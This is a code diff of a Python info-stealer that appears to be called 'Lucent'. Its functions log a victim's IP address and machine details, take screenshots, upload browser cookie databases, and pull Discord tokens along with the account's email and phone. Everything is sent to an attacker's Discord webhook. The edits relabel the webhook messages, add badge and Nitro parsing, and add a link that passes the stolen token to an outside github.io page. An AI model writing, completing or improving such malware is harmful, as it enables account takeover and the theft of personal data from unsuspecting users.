@@ -46,7 +46,7 @@ def iplogger():
 
     host = socket.gethostname()
     data = {
-        "username": "Lucent | Address",
+        "username": "Lucent",
         "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg", 
         "embeds": [{
             "title": "🏠️ IP INFO",
@@ -73,7 +73,7 @@ def iplogger():
                 }
             ],
             "footer": {
-                "text": "zakocord. | https://github.com/zakocord/Lucent"
+                "text": "zakocord. | github.com/zakocord/Lucent"
             }
         }]
     }
@@ -100,7 +100,7 @@ def machineinfo():
     pc_name = platform.node()
 
     data2 = {
-        "username": "Lucent | Machine", 
+        "username": "Lucent", 
         "content": f"{types}",
         "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
         "embeds": [
@@ -139,7 +139,7 @@ def machineinfo():
                     }                       
                 ],
                 "footer": {
-                    "text": "zakocord. | https://github.com/zakocord/Lucent"
+                    "text": "zakocord. | github.com/zakocord/Lucent"
                 }   
             }
         ]
@@ -162,7 +162,7 @@ def screenshot():
     with open(screenshot_path, "rb") as f:
         files = {"file": (screenshot_filename, f, "image/png")}
         data = {
-            "username": "Lucent | Screenshot", 
+            "username": "Lucent", 
             "content": f"📸 Screenshot",
             "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
         }
@@ -234,7 +234,7 @@ def checker():
 def cookie_webhook(webhook_url, status_lines, cookie_db_path):
     try:
         requests.post(webhook_url, json={
-            "username": "Lucent | Cookie",
+            "username": "Lucent",
             "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
             "embeds": [{
                 "title": "🍪 Cookie Search",
@@ -244,7 +244,7 @@ def cookie_webhook(webhook_url, status_lines, cookie_db_path):
 
         with open(cookie_db_path, 'rb') as f:
             data = {
-                "username": "Lucent | Cookie",
+                "username": "Lucent",
                 "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
             }
             files = {'file': (os.path.basename(cookie_db_path), f)}
@@ -352,46 +352,74 @@ def webhook(token):
     get_info = requests.get(api, headers=headers)
     if get_info.status_code == 200:
         user = get_info.json()
+    
+    premium_type = user.get("premium_type", 0)
+    nitro_type = "None" 
+    if premium_type == 1:
+        nitro_type = "<:emo:1363064691282149418> Nitro Classic"
+    elif premium_type == 2:
+       nitro_type = "<:nitro_booster:1363009541515513986> Boost Nitro"
+    elif premium_type == 3:
+       nitro_type = "<:nitro_booster:1363009541515513986> Basic Nitro"
 
-    user_id = user["id"]
-    user_name = user["username"]
-    email = user["email"]
-    phone = user["phone"]
+    BADGES = {
+    1: "Discord Staff",
+    2: "Partner",
+    4: "<:Hypesquad:1363064409424920616>",
+    8: "<:badge_1:1363064112975712276> ",
+    64: "<:hypesquad_2:1363009297885302876>",
+    128: "<:hypesquad_3:1363009295523909794>",
+    256: "<:hypesquad_1:1363009300297027624>",
+    512: "<:emo:1363064691282149418>",
+    }
+
+
+    user_id = user.get("id")
+    user_name = user.get("username")
+    email = user.get("email")
+    phone = user.get("phone")
+    user_badge = user.get("public_flags", 0)
     avatar_hash = user['avatar']
+
+    user_badges = [name for bit, name in BADGES.items() if user_badge & bit]
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None
 
     payload = {
-        "username": "Lucet | Token", 
+        "username": "Lucet", 
         "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
         "embeds": [
             {
-                "title": f"{user_name} | ({id})",  
+                "title": f"{user_name} | ({user_id})",  
                 "fields": [
                     {
-                        "name": "🔑 Token",
-                        "value": f"```{token}```",
+                        "name": "<:token:1363009168830631997> Token",
+                        "value": f"```{token}```\n[Click to Copy](https://zakocord.github.io/copy/?p={token})",
                         "inline": False
                     },
                     {
-                        "name": "📫️ Email",
-                        "value": f"```{email if email else ''}```",
+                        "name": "<:mail:1363060331131310261> Email",
+                        "value": f"```{email if email else 'WTF'}```",
                         "inline": False
                     },
                     {
-                        "name": "🔏 Password",
-                        "value": f"Soon",
-                        "inline": True
+                        "name": "<:phone:1363060332972740688> Phone",
+                        "value": f"{phone if phone else 'None'}",
+                        "inline": False
                     },
                     {
-                        "name": ":mobile_phone: Phone",
-                        "value": f"{phone if phone else 'N/A'}",
-                        "inline": True
+                        "name": "<:diamond:1363072286319710208> Badge",
+                        "value": f"-# {', '.join(user_badges) if user_badges else 'None'}",
+                        "inline": False
                     },
                     {
-                        "name": "💎 Nitro",
-                        "value": "im gay (Not Working) 💀",
-                        "inline": True
+                        "name": "<:nitro_booster:1363009541515513986> Nitro",
+                        "value": nitro_type,
+                        "inline": False
+                    },
+
+                    {
+                        "name": ""
                     }
                 ],
                 "footer": {
@@ -409,6 +437,7 @@ def webhook(token):
         print(" ")
     else:
         print(f"                            ")
+
 def main():
     checker()
     
